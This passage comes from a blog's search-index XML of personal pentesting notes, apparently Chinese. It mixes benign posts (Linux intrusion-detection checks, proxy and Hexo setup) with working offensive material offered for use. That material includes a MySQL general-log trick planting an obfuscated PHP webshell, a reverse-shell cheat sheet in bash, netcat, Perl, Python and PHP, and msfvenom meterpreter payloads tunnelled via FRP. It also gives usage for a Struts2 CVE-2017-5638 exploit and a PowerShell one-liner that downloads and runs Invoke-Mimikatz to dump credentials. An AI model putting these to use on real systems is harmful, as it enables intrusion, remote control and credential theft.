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]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL's general-log shell]]></title>
    <url>%2F2018%2F06%2F04%2FMySQL's%20general-log%20shell%2F</url>
    <content type="text"><![CDATA[MySQL ROOT: show variables like &apos;%general%&apos;; set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;; set global general_log = off;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>shell</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Frp结合VPS打造外网Meatsploit]]></title>
    <url>%2F2018%2F04%2F19%2FFrp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit%2F</url>
    <content type="text"><![CDATA[前言： 本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall 可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。然后试了下用Frp来转发，相比起来简直不要太爽。 1. 准备工作： VPS一台FRP ##下载地址：https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本） ２.安装步骤：在VPS上执行（我的是Centos x64）： wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frpc&amp;&amp;rm frpc.ini ##这个是客户端文件，用不上，删不删随意。 ./frps -c frps.ini ##默认配置文件启动服务端。 在自己电脑执行（我的是KALi x64）: wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frps&amp;&amp;rm frps.ini ##这个是服务端文件，用不上，删不删随意。 ./frpc -c frpc.ini ##使用配置文件启动客户端。 注意frpc.ini配置文件内容（详细参考）： [common] server_addr = *.*.*.* ##VPS的IP地址 server_port = 7000 [msf] type = tcp ##协议 local_ip = *.*.*.* ##本地内网主机IP。 local_port = 4444 ##本地MSF监听的端口 remote_port = 8011 ##Payload设置的LPORT端口,LHOST为VPS的IP。 Payload生成实例： $ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe MSf监听示例： Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) EXTENSIONS no Comma-separate list of extensions to load EXTINIT no Initialization strings for extensions LHOST 172.16.1.254 yes The listen address LPORT 4444 yes The listen port 附一张截图： 结束语：当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。]]></content>
      <categories>
        <category>msf</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to encrypt files and folders with eCryptfs in Ubuntu/Debian/kali linux]]></title>
    <url>%2F2018%2F03%2F27%2Fencrypt%20in%20linux%2F</url>
    <content type="text"><![CDATA[apt-get install ecryptfs-utils modprobe ecryptfs #Load the ecryptfs kernel driver ecryptfs-setup-private ##default ecryptfs-umount-private # to unmount ecryptfs-mount-private # to mount it again,Switch to another directory except home ####### ecryptfs-setup-private --noautoumount # avoid ecryptfs auto mount at login]]></content>
      <categories>
        <category>encrypt</category>
      </categories>
      <tags>
        <tag>encrypt</tag>
        <tag>eCryptfs</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
    <url>%2F2018%2F03%2F20%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>bash</tag>
        <tag>perl</tag>
        <tag>netcat</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python PyQt5]]></title>
    <url>%2F2018%2F03%2F07%2FPython%E5%AE%9E%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用Python3，PyQt5实现简易浏览器from PyQt5.QtWidgets import QApplication from PyQt5.QtWebEngineWidgets import QWebEngineView from PyQt5.QtCore import QUrl app = QApplication([]) view = QWebEngineView() view.load(QUrl(&quot;https://translate.google.cn&quot;)) view.show() app.exec_()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>pyqt5</tag>
        <tag>python</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to setup a socks5 proxy server using Dante]]></title>
    <url>%2F2018%2F01%2F22%2FHow-to-setup-a-socks5-proxy-server-using-Dante%2F</url>
    <content type="text"><![CDATA[debain可用参考链接： https://nfalcone.net/blog/danted-socks-proxy-server/ &gt; 其他： socks5软件包安装:# apt-get update &amp;&amp; apt-get upgrade # apt-get install dante-server # service danted restart # service danted status # danted -v danted: dante v1.1.19 socks5源码安装：# cd /usr/src # wget http://www.inet.no/dante/files/dante-1.4.2.tar.gz # tar -zxf dante-1.4.2.tar.gz # cd dante-1.4.2/ # apt-get install gcc make #./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-client --without-libwrap --without-bsdauth --without-gssapi --without-krb5 --without-upnp --without-pam # make &amp;&amp; make install # /usr/sbin/sockd -v Dante v1.4.2. Copyright (c) 1997 - 2014 Inferno Nettverk A/S, Norway Configuring Dante-server service script# vim /etc/init.d/sockd 参考链接：https://www.proxyrack.com/how-to-setup-a-socks5-proxy-server-using-dante/ debain可能遇到的问题： perl: warning: Falling back to the standard locale (“C”) root@host:~#locale-gen en_GB.UTF-8 root@host:~#localectl set-locale LANG=en_GB.UTF-8,LC_ALL=en_GB.UTF-8 参考：https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/ debain VPs 安装失败：仅作记录]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SS安装脚本]]></title>
    <url>%2F2018%2F01%2F22%2FSS%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[一键安装：wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh chmod +x shadowsocks-all.sh ./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 多用户配置文件：vim /etc/shadowsocks-go/config.json { &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;port_password&quot;:{ &quot;8989&quot;:&quot;password0&quot;, &quot;9001&quot;:&quot;password1&quot;, &quot;9002&quot;:&quot;password2&quot;, &quot;9003&quot;:&quot;password3&quot;, &quot;9004&quot;:&quot;password4&quot; }, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;timeout&quot;:600 } 卸载：./shadowsocks-all.sh uninstall 启动命令： 启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 echo &quot;alias ss=&apos;/etc/init.d/shadowsocks-go&apos;&quot; &gt;&gt; .bashrc Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status 各版本默认配置文件 Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json VPS测速脚本：wget -qO- –no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bash wget -qO- bench.sh | bash 或者 curl -Lso- bench.sh | bash]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ss</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xss常用测试代码]]></title>
    <url>%2F2018%2F01%2F18%2FXss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[简单测试代码： &lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf常用命令]]></title>
    <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
    <content type="text"><![CDATA[Msf安装： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall Msfshell java/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux实用技巧]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[自定义终端命令启动程序 编辑 .bashrc 文件： root@kali:~# vim .bashrc root@kali:~# source .bashrc exm： alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos; echo &quot;###&quot; &gt; file ##替换文件 echo &quot;###&quot; &gt;&gt; file ##追加写入文件 echo &quot;alias ss=&apos;ss start&apos;&quot; &gt;&gt; .bashrc 设置ssh免密码登录在.ssh目录下： 本地主机： ssh-keygen -t rsa ##生成id_rsa.pub cat vps_rsa.pub &gt;&gt; authorized_keys ##写入文件 复制authorized_keys到远程主机： scp -P 22 authorized_keys root@176.*.145.*:/root/.ssh 从远程主机下载文件： scp -P 22 root@176.*.145.*:/root/test.txt /root/ 批量操作文件find ./ -name &quot;*.docx&quot; | awk -F &quot;.&quot; &apos;{print $2}&apos; | xargs -i -t mv ./{}.docx ./{}.doc #批量修改后缀名 cp -r &apos;find root/a -iname *.doc&apos; root/b #批量复制某后缀名的文件 配置终端使用HTTP or SOCKS5代理 把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 export http_proxy=&quot;http://localhost:port&quot; export https_proxy=&quot;http://localhost:port&quot; 以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为 export http_proxy=&quot;socks5://127.0.0.1:1080&quot; export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者直接设置ALL_PROXY export ALL_PROXY=socks5://127.0.0.1:1080 然后ESC后:wq保存文件，接着在终端中执行 source ~/.bashrc 或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot; alias unsetproxy=&quot;unset ALL_PROXY&quot; alias ip=&quot;curl ip.cn&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>linux</tag>
        <tag>sh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux入侵检测基础]]></title>
    <url>%2F2018%2F01%2F18%2Flinux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[审计命令last 这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。 相关参数： last -10（-n） 查看最近10条记录 last -x reboot 查看重启的记录 last -x shutdown 查看关机的记录 last -d 查看登陆的记录 last –help 命令帮助信息 last -f wtmp 用last命令查看wtmp文件（直接打开无法查看） lastb 这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。 相关参数： lastb name（root） 查看root用户登陆失败记录 lastb -10（-n） 查看最近10条登陆失败记录 lastb –heplp 命令帮助信息 lastlog 这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。 相关参数： lastlog 所有用户上一次登陆记录 lastlog -u username（root） root用户上一次登陆记录 lastlog –help 命令帮助信息 who 这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。 history查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。 相关参数： history 查看所有历史记录 history -10 查看最近10条记录 history | grep “wget” 查看wget相关信息的记录 history –help 命令帮助信息 history显示时间戳： export HISTTIMEFORMAT=&quot;%F %Twhoami&quot; history | more 检查用户 Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。 less /etc/passwd 查看是否有新增用户 grep :0 /etc/passwd 查看是否有特权用户（root权限用户） ls -l /etc/passwd 查看passwd最后修改时间 cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd 查看是否存在特权用户 awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow 查看是否存在空口令用户 注：linux设置空口令：passwd -d username 检查进程 一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 普通进程ps -aux 查看进程 top查看进程 lsof -p pid 查看进程所打开的端口及文件 lsof -c 进程名 查看关联文件 ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill 杀死python相关的进程 检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v &quot;^#&quot;，输出的信息就是你这台机器所开启的远程服务。 隐藏进程ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1 ls /proc | sort -n |uniq &gt;2 diff 1 2 检查文件 被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。 find / -uid 0 -print 查找特权用户文件 find / -size +10000k -print 查找大于10000k的文件 find / -name &quot;…&quot; -prin 查找用户名为…的文件 find / -name core -exec ls -l {} \; 查找core文件，并列出详细信息 md5sum -b filename 查看文件的md5值 rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件） whereis 文件名 查看文件路径 ls -al 文件名 查看文件创建时间 du -sh 文件名 查看文件大小 检查网络 检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。 ip link | grep PROMISC 正常网卡不应该存在promisc，如果存在可能有sniffer lsof -i netstat -nap 查看不正常端口 arp -a 查看arp记录是否正常 ifconfig -a 查看网卡设置 检查计划任务 当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。 crontab -u root -l 查看root用户的计划任务 cat /etc/crontab ls -l /etc/cron.* 查看cron文件是否变化的详细信息 ls /var/spool/cron/ 检查系统后门 可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。 vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件 lsmod 检查内核模块 chkconfig –list/systemctl list-units –type=service 检查自启 查看著名的木门后门程序： ls /etc/rc.d #系统开机后，此目录下的文件会被启动 ls /etc/rc3.d find / -name “.rhosts” –print find / -name “.forward” –print 打包文件 当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？ 打包web文件打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：tar cvf my_txt_files.tar find . -type f -name &quot;*.jsp*&quot; 打包日志文件tar -cvf log.tar /var/log 打包其他信息last &gt; last.log netstat -an &gt; netstat.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>入侵检测，安全审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装NVIDIA显卡驱动]]></title>
    <url>%2F2018%2F01%2F10%2Fkali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[安装参考链接https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop验证：https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>NVIDIA</tag>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
    <url>%2F2017%2F03%2F16%2Fs2-045-exp-CVE-2017-5638%2F</url>
    <content type="text"><![CDATA[Usage: Testing a single URL. python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos; Testing a list of URLs. python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos; Checking if the vulnerability exists against a single URL. python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos; Checking if the vulnerability exists against a list of URLs. python struts-pwn.py --check --list &apos;urls.txt&apos; Requirements Python2 or Python3 requests https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>s2-045</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python command]]></title>
    <url>%2F2017%2F03%2F06%2FPython-command%2F</url>
    <content type="text"><![CDATA[python: py -2 hello.py py -3 hello.py pip py -2 -m pip install XXXX py -3 -m pip install XXXX]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SimpleHTTPServer]]></title>
    <url>%2F2017%2F03%2F05%2FSimpleHTTPServer%2F</url>
    <content type="text"><![CDATA[python -m SimpleHTTPServer 8080 #端口可自定义]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10-Cmd here]]></title>
    <url>%2F2017%2F03%2F04%2Fwin10-Cmd-here%2F</url>
    <content type="text"><![CDATA[保存为reg格式导入注册表即可： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo command]]></title>
    <url>%2F2017%2F03%2F02%2Fhexo-command%2F</url>
    <content type="text"><![CDATA[hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo clean hexo generate --deploy]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikittenz-Ps1版]]></title>
    <url>%2F2017%2F03%2F01%2Fmimikittenz-Ps1%E7%89%88%2F</url>
    <content type="text"><![CDATA[powershell “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1‘); Invoke-Mimikatz -DumpCreds”]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>mimikittenz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0o0-test]]></title>
    <url>%2F2017%2F03%2F01%2F0o0-test%2F</url>
    <content type="text"><![CDATA[测试文章–test—0o0~！！！！！！ hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHub hexo new [layout] hexo new photo “My Gallery”hexo new “Hello World” –lang tw title: 使用Hexo搭建个人博客layout: postdate: 2014-03-03 19:07:43comments: truecategories: Blogtags: [Hexo]keywords: Hexo, Blogdescription: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
